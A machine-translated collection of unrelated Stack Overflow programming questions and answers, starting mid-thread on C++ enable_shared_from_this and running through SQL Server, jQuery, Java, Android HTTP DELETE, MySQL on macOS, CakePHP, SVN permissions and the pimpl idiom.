这个问题和其他相关问题在 C++17 中得到了澄清。现在`std::enable_shared_from_this<T>`被指定为好像只有一个`std::weak_ptr<T> weak_this;`成员。对于 的非数组特化`std::shared_ptr`，该成员由`std::shared_ptr`构造函数分配`std::make_shared`，并且`std::allocate_shared`如 [util.smartptr.shared.const]/1 中所述：

> 启用`shared_­from_­this`with ，对于类型`p`的指针，意味着如果有一个明确且可访问的基类，它是 的特化，则应隐式转换为并且构造函数评估语句：`p``Y*``Y``enable_­shared_­from_­this``remove_­cv_­t<Y>*``T*`
> 
> ```
> if (p != nullptr && p->weak_this.expired())
>   p->weak_this = shared_ptr<remove_cv_t<Y>>(*this, const_cast<remove_cv_t<Y>*>(p)); 
> ```

因此，我的 OP 中第二个的正确行为`main`现在不会引发异常，并且两个“非空”检查都将显示为真。由于在调用`lock2()`internal时`weak_ptr`已经拥有，因此 not `expired()`，`lock2()`保持`weak_ptr`不变，因此第二次调用`shared_from_this()`返回 a `shared_ptr`which 与 共享所有权`p1`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-06-05T01:27:34.240

```
 X x;
  std::shared_ptr<X> p1 = x.lock1();
  (...sniped...)
} 
```

这样的代码打破了“拥有”“智能指针”的语义：

*   它们可以被复制
*   只要保留一份副本，就保留拥有的对象

这个不变量非常重要，我认为这种做法应该被代码审查拒绝。但是您建议的一种变体可以满足不变量：

*   对象必须是动态管理的（所以，不是自动的）
*   任何拥有对象的家族都共享动态管理对象的所有权
*   一个家庭的每个成员都拥有该家庭的“删除者”的所有权

所以在这里我们共享拥有对象，它们属于拥有对象的不同“家族”，它们不是“等价的”，因为它们不同：

*   “删除”对象
*   `use_count()`价值观
*   控制块
*   `owner_before`结果

但它们都阻止了同一个对象的破坏；这是通过`shared_ptr`在每个“删除器”对象中保留一份副本来完成的。

一个干净的替换用于`std::shared_from_this`完全控制`std::weak_ptr<T>`成员的初始化。

```
#include <memory>
#include <iostream>
#include <cassert>

// essentially like std::shared_from_this
// unlike std::shared_from_this the initialization IS NOT implicit
// calling set_owner forces YOU to THINK about what you are doing!

template <typename T>
class my_shared_from_this
{
    std::weak_ptr<T> weak;
public:
    void set_owner(std::shared_ptr<T>);
    std::shared_ptr<T> shared_from_this() const;
};

// shall be called exactly once
template <typename T>
void my_shared_from_this<T>::set_owner(std::shared_ptr<T> shared)
{
    assert (weak.expired());
    weak = shared;
}

template <typename T>
std::shared_ptr<T> my_shared_from_this<T>::shared_from_this() const
{
    assert (!weak.expired());
    return weak.lock();
}

class X : public my_shared_from_this<X>
{
public:
  struct Cleanup1 { 
    std::shared_ptr<X> own;
    Cleanup1 (std::shared_ptr<X> own) : own(own) {}
    void operator()(X*) const; 
  };

  struct Cleanup2 { 
    std::shared_ptr<X> own;
    Cleanup2 (std::shared_ptr<X> own) : own(own) {}
    void operator()(X*) const; 
  };

  std::shared_ptr<X> lock1();
  std::shared_ptr<X> lock2();

  X();
  ~X();
};

// new shared owner family with shared ownership with the other ones
std::shared_ptr<X> X::lock1()
{
  std::cout << "Resource 1 locked" << std::endl;
  // do NOT call set_owner here!!!
  return std::shared_ptr<X>(this, Cleanup1(shared_from_this()));
}

std::shared_ptr<X> X::lock2()
{
  std::cout << "Resource 2 locked" << std::endl;
  return std::shared_ptr<X>(this, Cleanup2(shared_from_this()));
}

void X::Cleanup1::operator()(X*) const
{
  std::cout << "Resource 1 unlocked" << std::endl;
}

void X::Cleanup2::operator()(X*) const
{
  std::cout << "Resource 2 unlocked" << std::endl;
}

X::X()
{
  std::cout << "X()" << std::endl;
}

X::~X()
{
  std::cout << "~X()" << std::endl;
}

// exposes construction and destruction of global vars
struct GlobDest {
  int id;
  explicit GlobDest(int id);
  ~GlobDest();
};

GlobDest::GlobDest(int id) 
  : id(id) 
{
    std::cout << "construction of glob_dest #" << id << std::endl;
}

GlobDest::~GlobDest() {
    std::cout << "destruction of glob_dest #" << id << std::endl;
}

GlobDest glob_dest0 {0};
std::shared_ptr<X> glob;
GlobDest glob_dest1 {1};

std::shared_ptr<X> make_shared_X()
{
    std::cout << "make_shared_X" << std::endl;
    std::shared_ptr<X> p = std::make_shared<X>();
    p->set_owner(p);
    return p;
}

int test()
{
  std::cout << std::boolalpha;

  std::shared_ptr<X> p = make_shared_X();
  static std::shared_ptr<X> stat;
  {
    std::shared_ptr<X> p1 = p->lock1();
    stat = p1;
    {
      std::shared_ptr<X> p2 = p->lock2();
      glob = p2;
      std::cout << "exit scope of p2" << std::endl;
    }
    std::cout << "exit scope of p1" << std::endl;
  }
  std::cout << "exit scope of p" << std::endl;
}

int main()
{
  test();
  std::cout << "exit main" << std::endl;
} 
```

输出：

```
construction of glob_dest #0
construction of glob_dest #1
make_shared_X
X()
Resource 1 locked
Resource 2 locked
exit scope of p2
exit scope of p1
exit scope of p
exit main
Resource 1 unlocked
destruction of glob_dest #1
Resource 2 unlocked
~X()
destruction of glob_dest #0 
```*

# sql - 添加新列后SQL Server无效的列名

> ID：10338609
> 
> 赞同：78
> 
> 时间：2012-04-26T17:43:51.227
> 
> 标签：sql, sql-server, sql-server-2008, tsql, sql-server-2005

我刚刚通过设计器将标识列添加到包含数据的现有表中`SSMS`，表更新正常，我可以成功对其运行选择查询，但查询完成后，我注意到新列带有红色下划线，错误指示这是一个无效的列名。

为什么会出现这种情况？如果列无效，我希望查询失败。

SSMS 是否保留对必须刷新的旧表的某种类型的内部引用？

我尝试关闭数据库连接并重新打开它，但仍然是同样的错误。不知道我在这里缺少什么。

```
SELECT TOP 100 
[PRIMARY_NDX_Col1],
[NEW_Col], --QUERY EXECUTES SUCCESSFULLY, BUT THIS IS UNDERLINED RED AS AN INVALID COLUMN
[Col3]
FROM [dbo].[MyTable] 
```

* * *

## 回答 #1

> 赞同：218
> 
> 时间：2012-04-26T17:51:43.060

你可以

*   按`Ctrl`+ `Shift`+`R`

或者

*   转到编辑>>智能感知>>刷新本地缓存

# javascript - jQuery：如何获取外部图像的尺寸？

> ID：10338613
> 
> 赞同：2
> 
> 时间：2012-04-26T17:44:13.097
> 
> 标签：javascript, jquery, image, dimensions

寻找一种方法来获取外部图像的尺寸*（宽度和高度） 。*
我使用过`prop()`and `attr()`，但它们不返回任何值。只是一个错误。

**例子：**

```
<a href="pathtotheimage">some link</a> 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-26T17:48:12.157

**jQuery**

```
var path = 'https://source.unsplash.com/random/600x300/?montreal';
$("<img/>").attr('src', path).load(function() {
    console.log(this.width, this.height);
 });
```

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
```

**香草 Javascript**

```
var path = 'https://source.unsplash.com/random/600x300/?montreal';
var img = new Image();
img.src = path;
img.addEventListener('load', function() {
  console.log(this.width, this.height);
});
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T18:03:35.347

看起来没有人提供一个有效的香草 js 答案。

```
var img = document.createElement('img')
img.src = 'http://domain.com/img.png'
img.onload = function() {
    console.log( this.width )
    console.log( this.height )
} 
```

这是一个jsfiddle：http: [//jsfiddle.net/Ralt/VMfVZ/](http://jsfiddle.net/Ralt/VMfVZ/)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-26T17:51:58.760

这在技术上不是 jQuery，但我会走以下路线：

```
var image = new Image(), width, height;
image.src = 'http://whereyourimage.is/heresmyimage.jpg';
width = image.width;
height = image.height; 
```

然后，您可以使用`width`and访问这些值`height`，例如`alert('My image is ' + width + ' pixels accross.');`

# java - 将类中对象的地址复制到参数中，以便稍后更改对象

> ID：10338614
> 
> 赞同：1
> 
> 时间：2012-04-26T17:44:13.587
> 
> 标签：java

在我的原始代码中，我将节点添加到树中。我的目标是以某种方式访问​​我在树中添加的最后一个节点（我的想法是创建另一个指向最后一个对象的对象（我的原始示例中的节点））。

```
public class RandomSubClass 
{
    int firstNum;
} 
```

* * *

```
import java.util.LinkedList;

public class RandomClass 
{
    LinkedList<RandomSubClass> myListOfObjects = new LinkedList<RandomSubClass>();

    void addItem(int firstNum, RandomSubClass toBeReturned)
    {       
        RandomSubClass o1 = new RandomSubClass();
        o1.firstNum = firstNum;
        myListOfObjects.add(o1);

        // Here I was thinking that 'toBeReturned' will get same address as
        // 'o1', and by changing 'toBeReturned' (in main), values in 'o1' change
        //
        toBeReturned = o1;

        // This following commented code worked, 
        // but I can't use it in my original code.
        //
        // The reason I can't use it is because when I add a node to a tree, 
        // I start at the root and trace the new node's way to a new leaf, 
        // which makes it hard to do (simply) that.
        //
        //toBeReturned.firstNum = firstNum;
        //myListOfObjects.add(toBeReturned);
    }   
} 
```

* * *

```
public class Main 
{
    public static void main(String[] args) 
    {
        RandomClass myList = new RandomClass();

        RandomSubClass r1 = new RandomSubClass();
        RandomSubClass r2 = new RandomSubClass();

        myList.addItem(1, r1);
        myList.addItem(2, r2);

        // I would like to do that, and see changes in the node in 'myList'
        //  
        r1.firstNum = 10;
        r2.firstNum = 20;
    }
} 
```

在将节点添加到树后，我想检查有关该节点的某些内容，如果它满足某些条件，我想更改该节点的标志。

我可以再次重新跟踪节点（从根开始），但我的树可能会在某个时候变得很大，这需要时间。因此，如果我在添加该节点时获得了该节点的地址，并且在检查了我的条件之后，我可以修改该地址处的标志，知道它将更改该节点处的标志（最后添加）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T17:59:16.663

是的，你可以这样做。我允许你。:-) 但是您的示例代码不起作用，因为 Java 对象是按值传递的，而不是按引用传递的。也就是说，当您将对象传递给函数时，如果您重新分配该对象，它对调用者没有影响。例如：

```
void caller()
{
  String s1="Hello";
  updateString(s1);
  System.out.println(s1);
}
void updateString(String s1)
{
  s1="Goodbye";
} 
```

这个函数的输出是“Hello”，而不是“Goodbye”。updateString 函数中的赋值不会改变调用者传入的值。

有（至少）三种方法可以做你想做的事。

方法一：最简单的就是返回新的对象，而不是更新一个参数：

```
SomeObject addItem(int firstnum)
{
  SomeObject o1=new SomeObject();
  o1.firstnum=firstnum;
  objectList.add(o1);
  return o1;
}
...
void callingFunction()
{
  SomeObject newObject=addItem(1);
  newObject.secondnum=2;
  ... etc ...
} 
```

我更喜欢这种不需要其他返回值的方法：它简洁明了。

方法2：创建一个全局变量并在其中存储对象的句柄。但是这种方法很糟糕，因为全局变量通常很糟糕。我只是提到它告诉你不要这样做。

方法 3：创建一个包装器来保存对对象的引用。然后将包装器传递给“add”函数，该函数可以更新类内的值。

```
class SomeObjectWrapper
{
  public SomeObject someObject;
}
...
void addItem(int firstnum, SomeObjectWrapper sow)
{
  SomeObject o1=new SomeObject();
  o1.firstnum=firstnum;
  objectList.add(o1);
  sow.someobject=o1;
}
...
void callingFunction()
{
  SomeObjectWrapper sow=new SomeObjectWrapper();
  SomeObject newObject=addItem(1, sow);
  sow.someObject.secondnum=2;
  ... whatever ...
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T17:50:03.233

用返回值来做这件事怎么样：

```
RandomSubClass addItem(int firstNum)
{       
    RandomSubClass o1 = new RandomSubClass();
    o1.firstNum = firstNum;
    myListOfObjects.add(o1);

    // Here I was thinking that 'toBeReturned' will get same address as
    // 'o1', and by changing 'toBeReturned' (in main), values in 'o1' change
    //
    ....
    return o1
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T17:55:07.977

在 Java 中，所有对象都通过地址的参数返回/传递。只有原始类型（int、float、double ...）按值传递，如果您希望原始类型按地址传递，请使用：-Integer 代替 int -Double 代替 double -Float 代替 Float -ect。 ..

# android - 在 Android 中发送 HTTP DELETE 请求

> ID：10338615
> 
> 赞同：29
> 
> 时间：2012-04-26T17:44:14.673
> 
> 标签：android, httpwebrequest

我的客户端 API 指定要删除对象，必须发送 DELETE 请求，其中包含描述内容的 Json 标头数据。实际上，这与添加对象的调用相同，这是通过 POST 完成的。这很好用，我的代码的内容如下：

```
HttpURLConnection con = (HttpURLConnection)myurl.openConnection();
con.setRequestMethod("POST");
con.setDoOutput(true);
con.setUseCaches(false);
con.connect();
OutputStreamWriter wr = new OutputStreamWriter(con.getOutputStream());
wr.write(data); // data is the post data to send
wr.flush(); 
```

为了发送删除请求，我将请求方法相应地更改为“DELETE”。但是我收到以下错误：

```
java.net.ProtocolException: DELETE does not support writing 
```

所以，我的问题是，如何从 Android 发送包含标头数据的 DELETE 请求？我是否遗漏了要点-您能否将标头数据添加到 DELETE 请求中？谢谢。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2013-05-11T12:57:53.217

有问题的线是`con.setDoOutput(true);`. 删除它将修复错误。

`addRequestProperty`您可以使用或将请求标头添加到 DELETE，`setRequestProperty`但不能添加请求正文。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2016-07-11T22:29:51.340

这是`HttpURLConnection`, 在旧 Android 版本 (<=4.4) 上的限制。

虽然您可以选择使用`HttpClient`，但我不推荐它，因为它是一个旧库，有几个问题[已从 Android 6](https://developer.android.com/about/versions/marshmallow/android-6.0-changes.html#behavior-apache-http-client)中删除。

我建议使用一个新的最近的库，比如[OkHttp](http://square.github.io/okhttp/)：

```
OkHttpClient client = new OkHttpClient();
Request.Builder builder = new Request.Builder()
    .url(getYourURL())
    .delete(RequestBody.create(
        MediaType.parse("application/json; charset=utf-8"), getYourJSONBody()));

Request request = builder.build();

try {
    Response response = client.newCall(request).execute();
    String string = response.body().string();
    // TODO use your response
} catch (IOException e) {
    e.printStackTrace();
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-26T17:56:17.757

getOutputStream() 仅适用于具有正文的请求，例如 POST。在没有正文的请求上使用它，例如 DELETE，将引发 ProtocolException。相反，您应该使用 addHeader() 添加标头，而不是调用 getOutputStream()。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2017-07-10T10:43:21.977

DELETE 请求是 GET 请求的扩展形式，根据 android 文档，您不能在 DELETE 请求的正文中编写。HttpUrlConnection 会抛出“**无法写入协议异常**”。

如果你还想在body中写参数，我建议你使用**OKHttp**库。

[OKHttp 文档](http://square.github.io/okhttp/)

如果您有兴趣使用更简单的库，那么您可以尝试 [SimpleHttpAndroid 库](https://github.com/yuviii/SimpleHttpAndroid)

这里要记住的一件事是，如果您没有在正文中写任何内容，则删除该行

```
conn.setDoOutput(true); 
```

谢谢，希望它可以帮助。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2016-02-27T00:22:09.153

我知道有点晚了，但如果有人像我一样在谷歌上搜索，我会这样解决：

```
 conn.setRequestProperty("X-HTTP-Method-Override", "DELETE");
    conn.setRequestMethod("POST"); 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2015-05-13T08:18:10.867

试试下面的方法来调用 HttpDelete 方法，它对我有用，希望对你也有用

```
String callHttpDelete(String url){

             try {
                    HttpParams httpParams = new BasicHttpParams();
                    HttpConnectionParams.setConnectionTimeout(httpParams, 15000);
                    HttpConnectionParams.setSoTimeout(httpParams, 15000);

                    //HttpClient httpClient = getNewHttpClient();
                    HttpClient httpClient = new DefaultHttpClient();// httpParams);

                    HttpResponse response = null;    
                    HttpDelete httpDelete = new HttpDelete(url);    
                    response = httpClient.execute(httpDelete); 

                    String sResponse;

                    StringBuilder s = new StringBuilder();

                    while ((sResponse = reader.readLine()) != null) {
                        s = s.append(sResponse);
                    }

                    Log.v(tag, "Yo! Response recvd ["+s.toString()+"]");
                    return s.toString();
                } catch (Exception e){
                    e.printStackTrace();
                }
              return s.toString();
        } 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-26T17:47:53.703

不能只用[`addHeader()`](http://developer.android.com/reference/org/apache/http/message/AbstractHttpMessage.html#addHeader%28java.lang.String,%20java.lang.String%29)方法吗？

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-09-05T20:52:23.137

这是我的`Delete`请求方法。

简单地说就是`post`额外的要求`RequestProperty`

```
connection.setRequestProperty("X-HTTP-Method-Override", "DELETE"); 
```

下面是完整的方法。

```
 public void executeDeleteRequest(String stringUrl, JSONObject jsonObject, String reqContentType, String resContentType, int timeout) throws Exception {
    URL url = new URL(stringUrl);
    HttpURLConnection connection = null;
    String urlParameters = jsonObject.toString();
    try {
        connection = (HttpURLConnection) url.openConnection();

        //Setting the request properties and header
        connection.setRequestProperty("X-HTTP-Method-Override", "DELETE");
        connection.setRequestMethod("POST");
        connection.setRequestProperty("User-Agent", USER_AGENT);
        connection.setRequestProperty(CONTENT_TYPE_KEY, reqContentType);
        connection.setRequestProperty(ACCEPT_KEY, resContentType);

        connection.setReadTimeout(timeout);
        connection.setConnectTimeout(defaultTimeOut);

        connection.setUseCaches(false);
        connection.setDoInput(true);
        connection.setDoOutput(true);

        // Send request
        DataOutputStream wr = new DataOutputStream(connection.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        responseCode = connection.getResponseCode();
        // To handle web services which server responds with response code
        // only
        try {
            response = convertStreamToString(connection.getInputStream());
        } catch (Exception e) {
            Log.e(Log.TAG_REST_CLIENT, "Cannot convert the input stream to string for the url= " + stringUrl + ", Code response=" + responseCode + "for the JsonObject: " + jsonObject.toString(), context);
        }
    } catch (
            Exception e
            )

    {
        if (!BController.isInternetAvailable(context)) {
            IntentSender.getInstance().sendIntent(context, Constants.BC_NO_INTERNET_CONNECTION);
            Log.e(Log.TAG_REST_CLIENT, "No internet connection", context);
        }
        Log.e(Log.TAG_REST_CLIENT, "Cannot perform the POST request successfully for the following URL: " + stringUrl + ", Code response=" + responseCode + "for the JsonObject: " + jsonObject.toString(), context);
        throw e;
    } finally{

        if (connection != null) {
            connection.disconnect();
        }
    }

} 
```

我希望它有所帮助。

* * *

## 回答 #9

> 赞同：-7
> 
> 时间：2013-01-26T12:16:55.420

为了给这个问题添加闭包，它发现没有支持的方法来发送包含标头数据的 HTTP DELETE 请求。

解决方案是让客户端更改其 API 以接受标准 GET 请求，该请求指示该操作应该是删除，包含要删除的项目的 id。

```
http://clienturl.net/api/delete/id12345 
```

# object-tag - DNA提取蟒蛇

> ID：10338616
> 
> 赞同：-2
> 
> 时间：2012-04-26T17:44:14.657
> 
> 标签：object-tag

现在，我需要找到一种方法，让 Python 可以找到上述代码的密码子位置 5 并提取该序列直到位置 12 ( ATGG* *CTTTACCTCGTC* *TCACAGGAG)。所以输出应该是这样的：

```
>CCODE1112_5..11
 CTTTACCTCGTC 
```

我如何告诉python在第一个“_”之后获取开始值，在“..”之后获取结束值，以便它可以自动完成？? 谢谢！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:52:57.517

```
def extractseq( queryseq , begin=5, end =12):
   queryseq=queryseq.split('\n')#transform the string in a list of lines included in the string

   return queryseq[1][begin-1:end-1] 
```

我认为这个函数应该可以工作，注意在 python 中从 0 开始的索引

在你的脚本中写完之后，你只需要调用函数 subs=extractseq(seq,5,12)

好的，抱歉，如果您想提取*子字符串*中包含的 5 和 12，一种简单的方法是：

```
substring=queryseq.split('\n')[0].split('_')[1].split('...')#extraction of the substring
begin=substring[0]
end = substring[1] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T18:02:17.813

我可能（叹气）使用正则表达式从 CCODE1112_5..12_ABC 中提取 5 和 12。

然后将提取的字符串转换为int。

然后在 DNA 数据的字符串切片中使用 int 作为索引。

对于正则表达式：

> > > > regex = re.compile(r'^[^ *]** (\d+)..(\d+)_.*$') regex.match('CCODE1112_5..12_ABC') match = regex.match('CCODE1112_5.. 12_ABC') match.group(1) '5' match.group(2) '12'

例如，要将它们转换为 int，请使用 int(match.group(1))。

那么你的索引是基于 1 的，而 python 是基于 0 的。此外，python 切片的起点是您想要的值，python 切片的终点是您想要的值的一个以上。因此，从 group(1) 中减去一个并保留 group(2)。

所以像： substring = dna_data[left_point-1:right_point]

# mysql - Snow Leopard Server MySQL Service 和 MacPorts MySQL 安装问题

> ID：10338621
> 
> 赞同：0
> 
> 时间：2012-04-26T17:44:30.587
> 
> 标签：mysql, macports, osx-server

试图退出 macports mysql 安装并返回到 Snow Leopard Server 的内置 MySQL 服务器，但我无法让它工作。

当我禁用 macports 并启用内置服务时，`mysql.sock`找不到（找到 mysql.sock 什么都不返回）。当我重新启用 macport mysql 时，找到了 mysql.sock 但现在我无法禁用内置的 MySQL 服务。

每次我尝试时，它都会重新启用它。

我必须运行以下命令才能让 MacPorts MySQL 在重新启动时工作：

```
sudo launchctl unload -w /Library/LaunchDaemons/org.macports.mysql5.plist
sudo launchctl load -w /Library/LaunchDaemons/org.macports.mysql5.plist
ln -s /var/mysql/mysql.sock /tmp/mysql.sock 
```

/var/mysql 上的权限是（这是内置服务设置的位置）：

```
drwxr-xr-x   111   _mysql   _mysql 
```

macports 数据目录的权限是：

```
drwxr-xr-x   116   _mysql   _mysql 
```

有一次，根据内置mysql的访问日志文件，它正确启动（2010）。有没有办法在我重新启动时手动禁用此服务启动？

我意识到我的问题有多不清楚，但不知何故，以前的管理员将 macports mysql 与内置 mysql 绑定在一起，我花了很长时间来解开它们。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T05:10:13.010

位于已安装应用程序的-files`/Library/LaunchDaemons/` `plist`中，这就是我所拥有的：

```
$ ls -l /Library/LaunchDaemons/
-r--r--r-- 1 root wheel 573 Jan 10 18:33 at.obdev.littlesnitchd.plist
-rw-r--r-- 1 root wheel 567 Mar  5 19:02 com.parallels.desktop.launchdaemon.plist
lrwxr-xr-x 1 root admin  74 Jan 20 06:21 org.macports.mysql5.plist -> /opt/local/etc/LaunchDaemons/org.macports.mysql5/org.macports.mysql5.plist
lrwxr-xr-x 1 root admin  74 Oct 14  2011 org.macports.rsyncd.plist -> /opt/local/etc/LaunchDaemons/org.macports.rsyncd/org.macports.rsyncd.plist 
```

如果您想检查 MacOS 捆绑服务的配置，请查看`/System/Library/LaunchDaemons/`.

# php - 致命错误：无法在 HtmlHelper.php (CakePHP) 中调用构造函数

> ID：10338622
> 
> 赞同：4
> 
> 时间：2012-04-26T17:44:34.250
> 
> 标签：php, cakephp-2.1

我正在为我的应用程序使用**cakephp 2.1.1**。我有一个控制器，我在这个控制器中使用文件缓存。在控制器的操作中，我使用插件 NUSOAP 调用 SOAPService。

我有两个动作：

**1.索引**

```
public function index() {
    $items = Cache::read('items', 'tenMinutes'); //tenMinutes is the configuration of cache

    if($items){
        $service = new Service();
        $items = $service->callService();
        Cache::write('items',$items,'tenMinutes');
    }

    $this->set('items',$items);
} 
```

**2\. 获取结果**

```
public function get_result() {
    $items = Cache::read('items','tenMinutes');

    if($items){

        //start block code filter items by params  
        ...
        //end

        $service = new Service();
        $result = $service->callService2($items);
        $this->set('result',$result);

    } else {

        //redirect index to load ítems
        $this->redirect(array('controller' =>'controllerName', 'action' => 'index'));
    }
} 
```

缓存的配置是：

```
Cache::config('tenMinutes', array(
        'engine' => 'File', //[required]
        'duration'=> '10 minutes', //[optional]
        'path' => CACHE, //[optional] use system tmp directory - remember to use absolute path
        'prefix' => 'cake_10_', //[optional]  prefix every cache file with this string
    )); 
```

当我调用 index 操作并且是 cakephp 第一次在缓存中写入时，出现以下错误：

**致命错误：无法在第 172 行的 C:\wamp\www\myapp\lib\Cake\View\Helper\HtmlHelper.php 中调用构造函数**

我第二次输入索引并且缓存已经填满，我单击按钮将我带到第二个操作（get_result），这将返回相同的错误。

有人能帮我吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T07:17:24.910

**HtmlHelper**继承自**Helper**。也许您在项目中的某个地方定义了一个自定义类 Helper，而 HtmlHelper 正尝试使用它的构造函数。

# svn - TortoiseSVN 无法提交，说“服务器禁止”

> ID：10338627
> 
> 赞同：11
> 
> 时间：2012-04-26T17:44:45.313
> 
> 标签：svn, tortoisesvn, commit, renaming

最近，我在不久前签出的文件夹中进行了一系列重命名更改。一旦我更新了所有重命名更改，我就会遇到无法提交任何内容的问题。它说：

![在此处输入图像描述](../Images/27a3f55090430eec3a813dd9d2dd2f23.png)

我能够读取、写入和更新新文件。我就是不能承诺。

我想我几乎尝试了所有方法 - 进行清理，删除并重新检查文件夹......

我已经用谷歌搜索了这个问题，有人在签出存储库时提到了一个区分大小写的问题，但我确信我的 svn 存储库 url 是正确的。请注意，在整个重命名更改之前，一切正常（提交和所有）。

有没有人有任何线索？

谢谢！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-04T14:17:51.083

我有同样的问题。它发生在我向其中一个存储库添加新用户组时。我不小心将我的最高用户组设置为只读，却没有意识到我在其中。由于 SVN 访问的工作方式，我最终无法突然提交任何文件或创建任何新文件夹。

首先确保您的 URL 与存储库完全匹配，这似乎是最常见的问题，然后[阅读此内容](http://www.visualsvn.com/support/topic/00033/)并按照 Bernard 的建议检查您的访问权限。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-07-04T08:44:06.267

请确保您输入了正确的用户名，因为它**区分大小写**，通常在用户名与 wordpress.org 上的大小写不匹配时发生。我已经浪费了几个小时来解决这个问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-07-29T11:14:12.270

我们在使用 CollabNet Subversion Edge 时遇到了这个问题。修复是确保我们的存储库访问规则中定义的组通过使用 @ 前缀引用其他组。用一个例子更好地解释：

仓库访问规则：

```
[MyRepository:/branches/dev]
* = r
@admin = rw
@dev = rw 
```

`[groups]`前：

```
admin=user1,user2
dev=user3,user4 
```

`[groups]`后：

```
admin=user1,user2
dev=@admin,user3,user4 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-04-05T05:50:41.727

我有同样的问题。
我正在使用乌龟 SVN。就我而言，我有两个组，例如“a-grp”和“b-grp”。提交访问被拒绝的用户 ID（例如 1234）在两个组中都可用。
'rw' 权限授予组 'a-grp' 用于根文件夹级别。
对于根文件夹中的子文件夹级别，“r”权限授予组“b-grp”。这就是问题所在。

我的错误存储库访问规则：

```
reqdocs=1234, 5696, 7458
testdocs=1234, 5525, 9969, 4444
<br>
[MyRepository:/branches/rootfolder]
@reqdocs= rw
<br>
[MyRepository:/branches/rootfolder/subfolder]
@testdocs= r 
```

因此，我从“testdocs”组中删除了用户 ID（1234）。现在它的工作。
希望能帮助到你。谢谢你。

# c# - c#中使用了pimpl成语吗？

> ID：10338628
> 
> 赞同：15
> 
> 时间：2012-04-26T17:44:45.817
> 
> 标签：c#, c++, pimpl-idiom

我来自 C# 背景，最近开始学习 C++。我遇到的一件事是 pimpl 成语。我为一些大公司做过 C# 开发，但从未遇到过。

也许这是错误的，但我的理解是在 C++ 中这是必要的，因为使用了头文件并且没有部分类选项。

但是在 C# 中，我们总是会使用类库来构建应用程序。如果库代码发生变化，我们会将其重新编译为 dll 并在应用程序项目中引用新的 dll。

我真的不明白为什么不能用 C++ 做同样的事情。Pimpl 对我来说只是一个丑陋的黑客。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-04-26T18:07:18.797

> c#中使用了pimpl成语吗？

这取决于你所说的这个成语是什么意思。

所讨论的习惯用法本质上是将类型的实现细节分成一个类，并将公共表面区域分成一个包装类，该类简单地保存一个指向实现类的指针。

这有两个好处。

首先，在 C++ 中，它可以导致编译时间的改进，因为公共表面区域的消费者只需要解析包含公共表面区域的头文件；他们不需要解析包含实现细节的头文件。

其次，它导致接口与实现非常清晰的分离；实现可以完全改变而不会对消费者产生任何影响，因为消费者永远不会看到实现细节。

第一个好处是在 C# 中无关紧要。C# 编译器很快。（在很大程度上当然是因为该语言被设计为可以快速编译。）

第二个好处是在 C# 中非常有用。在 C# 中，实现此模式的惯用方式是创建一个执行“真正”工作的*私有嵌套类*和一个只是具有公共表面区域的外观的公共类。

我在 C# 中特别喜欢的一种技术是使公共类成为私有嵌套类的*基*类，为基类提供私有构造函数以防止第三方扩展，并使用工厂模式分发私有嵌套类的实例。

> 我真的不明白为什么不能用 C++ 做同样的事情。

然后我鼓励你尝试编写一个 C++ 编译器来做这件事。你要么成功地创建了一个更快的 C++ 编译器，要么你会发现为什么同样的事情不能在 C++ 中完成。无论哪种方式，您都会受益！

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-26T17:52:15.423

是的，它是（“黑客”）。它是由 ANSI C++ 的基于文本的编译模型引起的：编译器需要查看代码的文本表示，以便生成有用的东西。不是必须这样，但今天就是这样。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-26T20:16:44.340

正如 Eric 所指出的，pimpl 成语有两个目的。我只想补充一点，第二个目的（分离接口和实现）是众所周知的软件设计模式之一：桥接（我认为也称为句柄/主体）。[你可以在这里](http://www.oodesign.com/bridge-pattern.html)阅读更多关于它的信息

# build - 在另一台机器上构建 - 工作流

> ID：10338634
> 
> 赞同：0
> 
> 时间：2012-04-26T17:44:56.577
> 
> 标签：build, makefile, workflow

我习惯于在 IDE 中构建源代码并在环境中获得良好的反馈。然而，目前我正在用 notepad++ 编写源代码，将其通过 ftp 传输到具有特定环境设置的另一台机器，然后在那里构建它并读取 Makefile 输出以查看它是否全部检查出来。之后，我将构建的可执行文件 scp 到实际设备上进行测试。

我很好奇是否有环境可以简化这一点。我想我可以编写一个脚本来 ftp 更改文件，然后通过 ssh 运行命令来构建它们。但我想要一个能够解析 makefile 输出并像大多数 IDE 一样为我提供构建报告的环境。我不确定这个问题有多具体，或者很多嵌入式系统是否有类似的设置。

理想情况下，我想我会有一台具有正确构建环境的机器，但事实并非如此：/

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:55:35.993

